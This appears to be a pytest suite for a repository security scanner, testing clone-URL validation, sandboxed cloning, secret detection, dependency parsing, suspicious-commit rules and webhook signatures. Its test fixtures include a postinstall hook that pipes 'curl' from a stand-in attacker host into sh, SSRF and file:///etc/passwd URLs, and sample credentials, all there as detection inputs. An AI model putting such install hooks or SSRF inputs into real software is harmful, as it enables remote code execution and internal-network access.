"""Comprehensive test suite for repository security scanning, sandbox, and webhooks."""

from __future__ import annotations

import hashlib
import hmac
import json
import os
import subprocess
import tempfile
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from terminus.auth.models import User
from terminus.config import Settings
from terminus.core.ids import OrgId, UserId
from terminus.orgs.models import OrganizationRole
from terminus.repo_security.commit_rules import scan_suspicious_patterns
from terminus.repo_security.deps_scan import (
    extract_repo_components,
    parse_package_lock_json,
    parse_requirements_txt,
    query_osv_vulnerabilities,
    scan_repository_dependencies,
)
from terminus.repo_security.runner import execute_scan, queue_repo_scan
from terminus.repo_security.sandbox import (
    SandboxSecurityError,
    clone_repository,
    safe_walk_files,
    validate_clone_url,
)
from terminus.repo_security.secrets_scan import (
    scan_line,
    scan_repository_secrets,
)
from terminus.repo_security.storage import SqliteRepoSecurityRepository
from terminus.server.app import create_app
from terminus.server.assets_api import get_asset_repository
from terminus.server.deps import (
    get_current_org,
    get_current_user,
    get_membership_store,
)
from terminus.storage.assets import SqliteAssetRepository
from terminus.storage.db import Database


@pytest.fixture
def repo_sec_db(tmp_path: Path) -> Database:
    db_path = str(tmp_path / "test_repo_sec.db")
    return Database.reset_instance(db_path)


# ─── 1. Sandbox & URL Security Tests ───────────────────────────────────────────


def test_url_policy_enforcement(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("TERMINUS_REPO_SCAN_ALLOW_LOCAL", raising=False)
    monkeypatch.setenv("TERMINUS_DEPLOYMENT_MODE", "hosted")

    # Valid allowlisted HTTPS URLs
    validate_clone_url("https://github.com/org/repo.git")
    validate_clone_url("https://gitlab.com/group/project")

    # Reject non-https protocols
    with pytest.raises(SandboxSecurityError, match="Protocol 'http' not allowed"):
        validate_clone_url("http://github.com/org/repo")
    with pytest.raises(SandboxSecurityError, match="Protocol 'ssh' not allowed"):
        validate_clone_url("ssh://git@github.com/org/repo")
    with pytest.raises(SandboxSecurityError, match="Protocol 'file' not allowed"):
        validate_clone_url("file:///etc/passwd")

    # Reject embedded credentials
    with pytest.raises(SandboxSecurityError, match="Embedded credentials"):
        validate_clone_url("https://user:password@github.com/org/repo")

    # Reject localhost & SSRF private addresses
    with pytest.raises(SandboxSecurityError, match="Localhost destination|not in the repository allowlist"):
        validate_clone_url("https://localhost/repo")
    with pytest.raises(SandboxSecurityError, match="Localhost destination|Destination IP '127.0.0.1' is not permitted|not in the repository allowlist"):
        validate_clone_url("https://127.0.0.1/repo")
    with pytest.raises(SandboxSecurityError, match="Destination IP '169.254.169.254' is not permitted|not in the repository allowlist"):
        validate_clone_url("https://169.254.169.254/repo")
    with pytest.raises(SandboxSecurityError, match="Destination IP '10.0.0.1' is not permitted|not in the repository allowlist"):
        validate_clone_url("https://10.0.0.1/repo")

    # Reject non-allowlisted host
    with pytest.raises(SandboxSecurityError, match="not in the repository allowlist"):
        validate_clone_url("https://evil-attacker.com/repo")


def test_no_code_execution_in_sandbox(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """A repo with malicious git hooks, setup.py, or scripts must never execute them."""
    monkeypatch.setenv("TERMINUS_DEPLOYMENT_MODE", "local")
    monkeypatch.setenv("TERMINUS_REPO_SCAN_ALLOW_LOCAL", "true")

    origin_dir = tmp_path / "malicious_repo"
    origin_dir.mkdir()
    marker_file = tmp_path / "EXECUTION_BREACH.txt"

    # Initialize a git repo with a post-checkout hook and setup.py that creates marker_file
    subprocess.run(["git", "init"], cwd=origin_dir, check=True, capture_output=True)
    subprocess.run(["git", "config", "user.email", "test@example.com"], cwd=origin_dir, check=True)
    subprocess.run(["git", "config", "user.name", "Test"], cwd=origin_dir, check=True)

    hooks_dir = origin_dir / ".git" / "hooks"
    hooks_dir.mkdir(exist_ok=True)
    post_checkout = hooks_dir / "post-checkout"
    post_checkout.write_text(f'#!/bin/sh\ntouch "{marker_file.as_posix()}"\n', encoding="utf-8")

    setup_file = origin_dir / "setup.py"
    setup_file.write_text(f'import os\nos.system("touch {marker_file.as_posix()}")\n', encoding="utf-8")

    subprocess.run(["git", "add", "."], cwd=origin_dir, check=True)
    subprocess.run(["git", "commit", "-m", "initial"], cwd=origin_dir, check=True)

    with clone_repository(origin_dir.as_posix()) as (clone_path, sha):
        assert clone_path.exists()
        assert len(sha) == 40
        # Assert the marker file was NEVER touched / created
        assert not marker_file.exists(), "Code execution detected during clone!"


# ─── 2. Secret Scanner Tests ───────────────────────────────────────────────────


def test_secret_scanner_true_positives_and_suppression() -> None:
    sample_aws = "AKIAIOSFODNN7EXAMPLE"
    sample_gh = "ghp_0123456789abcdefghijklmnopqrstuv"
    sample_slack = "xoxb-" + "mockslacktoken123"

    lines = [
        f"AWS_KEY = '{sample_aws}'",
        f"GITHUB_TOKEN = '{sample_gh}'",
        f"SLACK_BOT = '{sample_slack}'",
        f"SUPPRESSED_KEY = '{sample_aws}' # terminus:ignore",
    ]

    findings = []
    for idx, line in enumerate(lines, start=1):
        findings.extend(scan_line(line, "config.py", line_number=idx, commit_sha="abc1234"))

    # Exactly 3 findings, line 4 was suppressed
    assert len(findings) == 3
    rules = [f["rule"] for f in findings]
    assert "aws_access_key" in rules
    assert "github_token" in rules
    assert "slack_token" in rules

    # Assert raw secret values are NEVER present in preview or details
    for f in findings:
        assert sample_aws not in str(f)
        assert sample_gh not in str(f)
        assert sample_slack not in str(f)
        assert "[REDACTED]" in f["preview"]


def test_raw_secret_never_persisted_in_database_file(repo_sec_db: Database, tmp_path: Path) -> None:
    """Zero raw secret storage test: assert the raw credential cannot be grepped from SQLite binary."""
    asset_repo = SqliteAssetRepository(repo_sec_db)
    scan_repo = SqliteRepoSecurityRepository(repo_sec_db)

    asset = asset_repo.create("org-sec-val", "repository", "Vault Repo", "https://github.com/org/vault", None)
    scan = scan_repo.create_scan("org-sec-val", asset["asset_id"], trigger="manual")

    raw_val = "AKIAIOSFODNN7EXAMPLE"
    findings = scan_line(f"AWS_KEY = '{raw_val}'", "creds.py", 1, "sha-999")
    scan_repo.record_findings("org-sec-val", asset["asset_id"], scan["scan_id"], findings)

    # Inspect the raw sqlite file bytes
    with open(repo_sec_db.db_path, "rb") as f:
        db_bytes = f.read()

    assert raw_val.encode("utf-8") not in db_bytes, "Raw secret was found in SQLite binary file!"


def test_secret_history_scan(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Secrets committed and then deleted in a subsequent commit must still be detected."""
    monkeypatch.setenv("TERMINUS_DEPLOYMENT_MODE", "local")
    monkeypatch.setenv("TERMINUS_REPO_SCAN_ALLOW_LOCAL", "true")

    repo_dir = tmp_path / "history_repo"
    repo_dir.mkdir()
    subprocess.run(["git", "init"], cwd=repo_dir, check=True, capture_output=True)
    subprocess.run(["git", "config", "user.email", "test@example.com"], cwd=repo_dir, check=True)
    subprocess.run(["git", "config", "user.name", "Test"], cwd=repo_dir, check=True)

    secret_file = repo_dir / "secret.env"
    secret_file.write_text("AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n", encoding="utf-8")
    subprocess.run(["git", "add", "."], cwd=repo_dir, check=True)
    subprocess.run(["git", "commit", "-m", "add secret"], cwd=repo_dir, check=True)

    # Delete the secret in next commit
    secret_file.write_text("AWS_ACCESS_KEY_ID=[REMOVED]\n", encoding="utf-8")
    subprocess.run(["git", "add", "."], cwd=repo_dir, check=True)
    subprocess.run(["git", "commit", "-m", "remove secret"], cwd=repo_dir, check=True)

    with clone_repository(repo_dir.as_posix()) as (clone_path, sha):
        findings = scan_repository_secrets(clone_path, sha)
        assert len(findings) >= 1
        aws_findings = [f for f in findings if f["rule"] == "aws_access_key"]
        assert len(aws_findings) == 1
        assert aws_findings[0]["details"].get("source") == "git_history"


# ─── 3. Dependency Scanner Tests ───────────────────────────────────────────────


def test_parse_requirements_txt(tmp_path: Path) -> None:
    req_file = tmp_path / "requirements.txt"
    req_file.write_text(
        "requests==2.28.1\n"
        "flask>=2.0.0\n"
        "urllib3==1.26.5\n"
        "# comment line\n"
        "pytest\n",
        encoding="utf-8",
    )

    comps = parse_requirements_txt(req_file, "requirements.txt")
    assert len(comps) == 4

    pinned = [c for c in comps if c["pinned"]]
    assert len(pinned) == 2
    assert {"name": "requests", "version": "2.28.1", "ecosystem": "PyPI", "source_file": "requirements.txt", "pinned": True} in comps
    assert {"name": "urllib3", "version": "1.26.5", "ecosystem": "PyPI", "source_file": "requirements.txt", "pinned": True} in comps

    unpinned = [c for c in comps if not c["pinned"]]
    assert len(unpinned) == 2
    unpinned_names = [c["name"] for c in unpinned]
    assert "flask" in unpinned_names
    assert "pytest" in unpinned_names


def test_parse_package_lock_json(tmp_path: Path) -> None:
    lock_file = tmp_path / "package-lock.json"
    lock_file.write_text(
        json.dumps({
            "name": "sample-app",
            "lockfileVersion": 3,
            "packages": {
                "": {"name": "sample-app", "version": "1.0.0"},
                "node_modules/lodash": {"version": "4.17.20"},
                "node_modules/axios": {"version": "0.21.1"},
            },
        }),
        encoding="utf-8",
    )

    comps = parse_package_lock_json(lock_file, "package-lock.json")
    assert len(comps) == 2
    names = {c["name"]: c["version"] for c in comps}
    assert names["lodash"] == "4.17.20"
    assert names["axios"] == "0.21.1"


# ─── 4. Suspicious Commit Rules Tests ─────────────────────────────────────────


def test_suspicious_commit_rules(tmp_path: Path) -> None:
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True)
    (wf_dir / "ci.yml").write_text("name: CI\non: [push]\njobs:\n  test:\n    runs-on: ubuntu-latest\n", encoding="utf-8")

    pkg_file = tmp_path / "package.json"
    pkg_file.write_text(json.dumps({
        "name": "test-pkg",
        "scripts": {"postinstall": "curl http://attacker.invalid | sh"},
    }), encoding="utf-8")

    (tmp_path / "payload.exe").write_bytes(b"\x4d\x5a\x90\x00")

    findings = scan_suspicious_patterns(tmp_path, "commit123")
    rules = [f["rule"] for f in findings]
    assert "ci_workflow_modification" in rules
    assert "suspicious_install_script_postinstall" in rules
    assert "binary_file_in_tree" in rules


# ─── 5. End-to-End Scan & Database Deduplication ───────────────────────────────


@pytest.mark.asyncio
async def test_execute_scan_and_deduplication(
    repo_sec_db: Database,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("TERMINUS_DEPLOYMENT_MODE", "local")
    monkeypatch.setenv("TERMINUS_REPO_SCAN_ALLOW_LOCAL", "true")

    # Create dummy git repository
    repo_dir = tmp_path / "target_repo"
    repo_dir.mkdir()
    subprocess.run(["git", "init"], cwd=repo_dir, check=True, capture_output=True)
    subprocess.run(["git", "config", "user.email", "test@example.com"], cwd=repo_dir, check=True)
    subprocess.run(["git", "config", "user.name", "Test"], cwd=repo_dir, check=True)

    (repo_dir / "app.py").write_text("KEY = 'AKIAIOSFODNN7EXAMPLE'\n", encoding="utf-8")
    (repo_dir / "requirements.txt").write_text("requests==2.18.0\n", encoding="utf-8")

    subprocess.run(["git", "add", "."], cwd=repo_dir, check=True)
    subprocess.run(["git", "commit", "-m", "initial commit"], cwd=repo_dir, check=True)

    asset_repo = SqliteAssetRepository(repo_sec_db)
    scan_repo = SqliteRepoSecurityRepository(repo_sec_db)

    asset = asset_repo.create(
        "org-test-sec", "repository", "Target Repo", repo_dir.as_posix(), "Test notes"
    )

    # Run scan 1
    scan1 = scan_repo.create_scan("org-test-sec", asset["asset_id"], trigger="manual")
    res1 = await execute_scan("org-test-sec", asset["asset_id"], scan1["scan_id"])
    assert res1["status"] == "completed"

    findings1 = scan_repo.list_findings("org-test-sec", asset_id=asset["asset_id"])
    assert len(findings1) >= 1

    # Run scan 2 on same commit: must NOT duplicate findings
    scan2 = scan_repo.create_scan("org-test-sec", asset["asset_id"], trigger="manual")
    res2 = await execute_scan("org-test-sec", asset["asset_id"], scan2["scan_id"])
    assert res2["status"] == "completed"

    findings2 = scan_repo.list_findings("org-test-sec", asset_id=asset["asset_id"])
    assert len(findings2) == len(findings1)

    # Test status update creates immutable audit event
    target_finding = findings2[0]
    updated = scan_repo.update_finding_status(
        "org-test-sec", target_finding["finding_id"], "false_positive", actor="admin", details={"note": "Verified safe"}
    )
    assert updated is not None
    assert updated["status"] == "false_positive"

    events = repo_sec_db.fetchall(
        "SELECT * FROM repo_finding_events WHERE finding_id = ?", (target_finding["finding_id"],)
    )
    assert len(events) == 1
    assert events[0]["from_status"] == "open"
    assert events[0]["to_status"] == "false_positive"


# ─── 6. API, Webhooks & Feature Flag Gating ────────────────────────────────────


class _TestMembership:
    def role_of(self, org_id: str, user_id: str) -> OrganizationRole:
        return OrganizationRole.ADMIN


@pytest.fixture
def repo_client(repo_sec_db: Database) -> TestClient:
    app = create_app()

    async def user_override() -> User:
        return User(
            user_id=UserId("u-admin"),
            email="admin@example.com",
            display_name="Admin",
            password_hash="mock_hash",
            created_at="2026-01-01T00:00:00Z",
        )

    async def org_override() -> OrgId:
        return OrgId("org-test-sec")

    app.dependency_overrides[get_current_user] = user_override
    app.dependency_overrides[get_current_org] = org_override
    app.dependency_overrides[get_membership_store] = lambda: _TestMembership()
    app.dependency_overrides[get_asset_repository] = lambda: SqliteAssetRepository(repo_sec_db)
    return TestClient(app)


def test_repo_scan_feature_flag_gating(repo_client: TestClient, monkeypatch: pytest.MonkeyPatch) -> None:
    # When feature flag is OFF (default)
    monkeypatch.setenv("TERMINUS_REPO_SCAN_ENABLED", "false")
    res = repo_client.post("/assets/some-id/scan")
    assert res.status_code == 404

    # When feature flag is ON
    monkeypatch.setenv("TERMINUS_REPO_SCAN_ENABLED", "true")
    # Non-existent asset
    res_on = repo_client.post("/assets/nonexistent/scan")
    assert res_on.status_code == 404
    assert res_on.json()["detail"] == "Asset not found"


def test_github_webhook_signature_and_asset_resolution(
    repo_client: TestClient,
    repo_sec_db: Database,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("TERMINUS_REPO_SCAN_ENABLED", "true")
    secret = "test-webhook-secret-2026"
    monkeypatch.setenv("TERMINUS_GITHUB_WEBHOOK_SECRET", secret)

    # Register repo asset
    repo = SqliteAssetRepository(repo_sec_db)
    repo.create(
        "org-test-sec", "repository", "Repo Webhook Target", "https://github.com/my-org/my-repo", None
    )

    payload = {
        "ref": "refs/heads/main",
        "repository": {
            "clone_url": "https://github.com/my-org/my-repo.git",
            "html_url": "https://github.com/my-org/my-repo",
        },
    }
    body_bytes = json.dumps(payload).encode("utf-8")

    # 1. Invalid signature -> 401
    bad_sig_res = repo_client.post(
        "/repos/webhook/github",
        content=body_bytes,
        headers={"X-Hub-Signature-256": "sha256=invalidhexsignature", "Content-Type": "application/json"},
    )
    assert bad_sig_res.status_code == 401

    # 2. Valid signature -> 200 / queued
    valid_sig = "sha256=" + hmac.new(secret.encode("utf-8"), body_bytes, hashlib.sha256).hexdigest()
    good_res = repo_client.post(
        "/repos/webhook/github",
        content=body_bytes,
        headers={"X-Hub-Signature-256": valid_sig, "Content-Type": "application/json"},
    )
    assert good_res.status_code == 200
    assert good_res.json()["status"] == "queued"
    assert good_res.json()["org_id"] == "org-test-sec"


# ─── 7. Hardening Regression Tests ─────────────────────────────────────────────


def test_local_mode_https_bypass_rejected(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """In local mode with the escape flag set, remote URLs must still be fully validated."""
    from fastapi import HTTPException

    from terminus.server.assets_api import _validate_repo_locator

    monkeypatch.setenv("TERMINUS_DEPLOYMENT_MODE", "local")
    monkeypatch.setenv("TERMINUS_REPO_SCAN_ALLOW_LOCAL", "true")

    # The local escape hatch still accepts bare filesystem paths and file:// URLs
    validate_clone_url(tmp_path.as_posix())
    validate_clone_url(f"file://{tmp_path.as_posix()}")
    _validate_repo_locator(tmp_path.as_posix())

    # An https URL on a non-allowlisted host must NOT bypass validation in any mode
    with pytest.raises(SandboxSecurityError, match="not in the repository allowlist"):
        validate_clone_url("https://evil.example.com/x")
    with pytest.raises(HTTPException) as exc_info:
        _validate_repo_locator("https://evil.example.com/x")
    assert exc_info.value.status_code == 422

    # scp-style SSH locators are remote, not local paths
    with pytest.raises(SandboxSecurityError, match="not allowed"):
        validate_clone_url("git@github.com:org/repo.git")


def test_github_webhook_resolves_only_configured_org(
    repo_client: TestClient,
    repo_sec_db: Database,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """When two orgs share a locator, the webhook resolves only the intended org."""
    monkeypatch.setenv("TERMINUS_REPO_SCAN_ENABLED", "true")
    secret = "test-webhook-secret-org-scope"
    monkeypatch.setenv("TERMINUS_GITHUB_WEBHOOK_SECRET", secret)

    shared_locator = "https://github.com/shared-org/shared-repo"
    repo = SqliteAssetRepository(repo_sec_db)
    asset_a = repo.create("org-a", "repository", "Org A Repo", shared_locator, None)
    repo.create("org-b", "repository", "Org B Repo", shared_locator, None)

    payload = {
        "ref": "refs/heads/main",
        "repository": {
            "clone_url": "https://github.com/shared-org/shared-repo.git",
            "html_url": shared_locator,
        },
    }
    body_bytes = json.dumps(payload).encode("utf-8")
    valid_sig = "sha256=" + hmac.new(secret.encode("utf-8"), body_bytes, hashlib.sha256).hexdigest()
    headers = {"X-Hub-Signature-256": valid_sig, "Content-Type": "application/json"}

    # 1. Configured tenant context: resolves strictly within org-a
    monkeypatch.setenv("TERMINUS_GITHUB_WEBHOOK_ORG_ID", "org-a")
    res = repo_client.post("/repos/webhook/github", content=body_bytes, headers=headers)
    assert res.status_code == 200
    assert res.json()["status"] == "queued"
    assert res.json()["org_id"] == "org-a"
    assert res.json()["asset_id"] == asset_a["asset_id"]

    scans_a = repo_sec_db.fetchall("SELECT * FROM repo_scans WHERE org_id = ?", ("org-a",))
    scans_b = repo_sec_db.fetchall("SELECT * FROM repo_scans WHERE org_id = ?", ("org-b",))
    assert len(scans_a) == 1
    assert scans_a[0]["asset_id"] == asset_a["asset_id"]
    assert scans_b == []

    # 2. No configured tenant and a cross-org locator collision: fail closed
    monkeypatch.delenv("TERMINUS_GITHUB_WEBHOOK_ORG_ID", raising=False)
    res_ambiguous = repo_client.post("/repos/webhook/github", content=body_bytes, headers=headers)
    assert res_ambiguous.status_code == 404

    # No additional scans were queued for either org by the ambiguous delivery
    assert len(repo_sec_db.fetchall("SELECT * FROM repo_scans WHERE org_id = ?", ("org-a",))) == 1
    assert repo_sec_db.fetchall("SELECT * FROM repo_scans WHERE org_id = ?", ("org-b",)) == []


def test_queue_repo_scan_without_event_loop_marks_failed(repo_sec_db: Database) -> None:
    """A synchronous caller with no running loop must not leave the scan queued forever."""
    asset_repo = SqliteAssetRepository(repo_sec_db)
    scan_repo = SqliteRepoSecurityRepository(repo_sec_db)
    asset = asset_repo.create(
        "org-no-loop", "repository", "No Loop Repo", "https://github.com/org/no-loop", None
    )

    # No event loop is running in this synchronous test
    scan_id = queue_repo_scan("org-no-loop", asset["asset_id"], trigger="manual")

    scan = scan_repo.get_scan("org-no-loop", scan_id)
    assert scan is not None
    assert scan["status"] == "failed"
    assert "no running event loop" in scan["error"]
